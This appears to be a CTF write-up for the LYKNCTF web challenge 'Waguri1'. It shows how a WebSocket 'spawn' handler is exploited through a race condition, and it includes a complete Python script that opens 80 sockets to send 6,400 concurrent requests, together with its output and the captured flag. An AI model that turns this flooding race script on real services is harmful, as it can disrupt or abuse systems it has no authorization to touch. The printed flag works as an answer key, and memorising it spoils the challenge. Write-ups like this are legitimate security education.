---
title: Waguri1
date: 2026-07-06
tags:
- web
- LYKNCTF
---

- **Challenge:** Waguri1
- **Category:** Web
- **Flag:** `LYKNCTF{409a5363c1034226b1a9ae7abc65062b}`

---

## My initial read / first impressions

The challenge description says:

```text
The SPAWN button looks harmless, but there's something behind it. Can you find it out?
```

Opening the site gives a very simple page with one big button:

```text
SPAWN
```

At first this looks like one of those challenges where the button loads a random image or plays a sound and maybe one of the assets has the flag hidden inside it. But the challenge name/idea also hints at something a little more server-side: the word **SPAWN** sounds like an action that might be tracked by the backend.

So instead of only clicking the button manually, I checked the page source to see what the button was actually doing.

## The important clue

The source had this JavaScript:

```js
const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
const socket = new WebSocket(`${protocol}//${window.location.host}`);
```

And the button click handler was:

```js
spawnButton.addEventListener('click', () => {
  if (socket.readyState !== WebSocket.OPEN) {
    return;
  }

  socket.send(JSON.stringify({ type: 'spawn' }));
});
```

So the page is not submitting a normal HTTP form at all. It opens a WebSocket connection to the same host and sends this message whenever the button is clicked:

```json
{"type":"spawn"}
```

The client also listens for messages like this:

```js
if (message.type === 'spawned' && message.image && message.sound) {
  showSpawn(message.image, message.sound);
}
```

So the normal behavior is:

```text
click SPAWN
  -> send {"type":"spawn"} over WebSocket
  -> server replies with an image path and a sound path
  -> browser shows the image and plays the sound
```

That means the browser is just a thin wrapper around the WebSocket API. If the button can send one `spawn` message, a script can send a lot of them.

## Testing the WebSocket

I wrote a small script to connect to the WebSocket and send the same JSON that the browser sends:

```python
await ws.send(json.dumps({"type": "spawn"}))
```

That returned normal responses like:

```json
{"type":"spawned","image":"/images/1.gif","sound":"/sounds/7.mp3","spawnId":1}
```

The returned image and sound files were real assets, so I also had the script download anything path-like that came back from the WebSocket. I did not want to miss a flag hidden in an image, sound, filename, or special response.

But the really interesting part was that the server sometimes returned:

```json
{"type":"error","message":"spawn already running"}
```

That is basically the challenge accidentally saying: hey, there is some shared spawn state on the server.

If the server is trying to prevent more than one spawn from running at a time, then the obvious thing to try is racing it with a bunch of WebSocket connections at once.

## Racing the spawn handler

The solve was to open many WebSocket connections and send a lot of `spawn` messages quickly. The important part of the script was:

```python
async def worker(worker_id, sends_per_conn):
    async with websockets.connect(BASE_WS, max_size=None, ping_interval=None) as ws:
        print(f"[+] Worker {worker_id} connected")

        for _ in range(sends_per_conn):
            await ws.send(json.dumps({"type": "spawn"}))

        while True:
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=3)
            except asyncio.TimeoutError:
                break

            print(f"[WS {worker_id}] {msg}")

            if "LYKN" in msg:
                print(msg)
                return
```

Then I launched a bunch of workers:

```python
connections = 80
sends_per_conn = 80

tasks = [
    asyncio.create_task(worker(i, sends_per_conn))
    for i in range(connections)
]

await asyncio.gather(*tasks, return_exceptions=True)
```

So instead of clicking the button once, the script sends thousands of spawn requests across many sockets.

## The winning response

After enough concurrent requests, one of the WebSocket responses changed from a normal `spawned` response into this:

```json
{"type":"spawned","image":"/images/1.gif","sound":"/sounds/1.mp3","spawnId":6,"race":"won","flag":"LYKNCTF{409a5363c1034226b1a9ae7abc65062b}"}
```

That `race":"won"` field confirms the intended bug. The challenge is literally a race condition around the spawn logic.

The server probably has code shaped something like:

```text
if spawn is already running:
    reject request
else:
    mark spawn as running
    do spawn work
```

But the check and the state update are not atomic. With enough requests arriving at the same time, one request slips into the special winning path before the server's protection fully catches up.

## Full solve script

This is the script I used:

```python
#!/usr/bin/env python3
import asyncio
import json
import re
import os
import hashlib
from urllib.parse import urljoin

import aiohttp
import websockets

BASE_HTTP = "http://fa4e9c10-0d19-4a89-b0ba-42386086f212.51.79.140.18.nip.io:8080/"
BASE_WS = "ws://fa4e9c10-0d19-4a89-b0ba-42386086f212.51.79.140.18.nip.io:8080/"

FLAG_RE = re.compile(rb"(LYKNCTF|LYKN)\{[^}]+\}")

os.makedirs("loot", exist_ok=True)

seen_urls = set()
seen_messages = set()
found = False


def check_flag(data: bytes, where: str):
    global found
    m = FLAG_RE.search(data)
    if m:
        print(f"\n[+] FLAG found in {where}:")
        print(m.group().decode(errors="replace"))
        found = True
        return True
    return False


async def fetch_asset(session, path):
    if not path:
        return

    url = urljoin(BASE_HTTP, path)

    if url in seen_urls:
        return

    seen_urls.add(url)
    print(f"[+] Fetching asset: {url}")

    try:
        async with session.get(url, timeout=10) as r:
            data = await r.read()
            print(f"    status={r.status} size={len(data)} content-type={r.headers.get('content-type')}")

            check_flag(url.encode(), url)
            check_flag(data, url)

            h = hashlib.sha256(data).hexdigest()[:16]
            name = path.strip("/").replace("/", "_") or h
            out = f"loot/{h}_{name}"

            with open(out, "wb") as f:
                f.write(data)

    except Exception as e:
        print(f"    [-] fetch failed: {e}")


async def worker(worker_id, sends_per_conn):
    global found

    async with aiohttp.ClientSession() as session:
        try:
            async with websockets.connect(
                BASE_WS,
                max_size=None,
                ping_interval=None,
                close_timeout=1,
            ) as ws:
                print(f"[+] Worker {worker_id} connected")

                for _ in range(sends_per_conn):
                    await ws.send(json.dumps({"type": "spawn"}))

                while not found:
                    try:
                        msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    except asyncio.TimeoutError:
                        break

                    if msg in seen_messages:
                        continue

                    seen_messages.add(msg)
                    print(f"[WS {worker_id}] {msg}")

                    check_flag(msg.encode(), f"websocket message from worker {worker_id}")

                    try:
                        obj = json.loads(msg)
                    except Exception:
                        continue

                    for key, value in obj.items():
                        if isinstance(value, str):
                            check_flag(value.encode(), f"JSON field {key}")

                            if value.startswith("/") or value.startswith("http"):
                                await fetch_asset(session, value)

                    if obj.get("type") == "spawned":
                        await fetch_asset(session, obj.get("image"))
                        await fetch_asset(session, obj.get("sound"))

        except Exception as e:
            print(f"[-] Worker {worker_id} error: {e}")


async def main():
    connections = 80
    sends_per_conn = 80

    print(f"[+] Opening {connections} sockets")
    print(f"[+] Sending {connections * sends_per_conn} total spawn requests")

    tasks = [
        asyncio.create_task(worker(i, sends_per_conn))
        for i in range(connections)
    ]

    await asyncio.gather(*tasks, return_exceptions=True)

    if not found:
        print("\n[-] No flag found yet.")
        print("[*] Try increasing connections/sends_per_conn.")
        print("[*] Also inspect files saved in ./loot manually.")


if __name__ == "__main__":
    asyncio.run(main())
```

Running it gave:

```text
[+] Opening 80 sockets
[+] Sending 6400 total spawn requests
...
[WS 16] {"type":"spawned","image":"/images/1.gif","sound":"/sounds/1.mp3","spawnId":6,"race":"won","flag":"LYKNCTF{409a5363c1034226b1a9ae7abc65062b}"}

[+] FLAG found in websocket message from worker 16:
LYKNCTF{409a5363c1034226b1a9ae7abc65062b}
```

## Why this works

The frontend makes the challenge look like a harmless button-click toy, but the button is just sending WebSocket messages. Once I copied that behavior into a script, I was no longer limited by the UI.

The server also revealed the concurrency issue through this error:

```json
{"type":"error","message":"spawn already running"}
```

That showed there was a backend state machine trying to track whether a spawn was active. By opening many connections and sending many `spawn` messages quickly, the script forced a timing bug in that state machine and reached the hidden `race":"won"` response.

## Flag

```text
LYKNCTF{409a5363c1034226b1a9ae7abc65062b}
```
